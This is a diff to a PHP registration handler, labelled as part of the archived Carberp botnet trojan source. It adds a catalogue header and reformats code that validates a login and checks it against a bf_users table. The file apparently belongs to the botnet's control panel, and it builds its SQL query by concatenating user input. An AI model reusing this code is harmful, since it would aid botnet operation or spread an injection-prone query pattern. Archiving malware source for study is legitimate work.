@@ -1,6 +1,18 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
-if(isset($_POST['reg_submit'])){	@array_walk($_POST, 'real_escape_string');
+if(isset($_POST['reg_submit'])){
+	@array_walk($_POST, 'real_escape_string');
 	$_POST['login'] = @strtolower($_POST['login']);
 
 	if(empty($_POST['login'])){
@@ -8,7 +20,8 @@ if(isset($_POST['reg_submit'])){	@array_walk($_POST, 'real_escape_string');
 		$FORM_BAD = 1;
 	}else{
         $result = $mysqli->query("SELECT login FROM bf_users WHERE (login='".$_POST['login']."')");
-        if($result->login == $_POST['login']){        	$bad_form['login'] = 'Введенный логин уже есть в системе.';
+        if($result->login == $_POST['login']){
+        	$bad_form['login'] = 'Введенный логин уже есть в системе.';
         	$FORM_BAD = 1;
         }
 	}
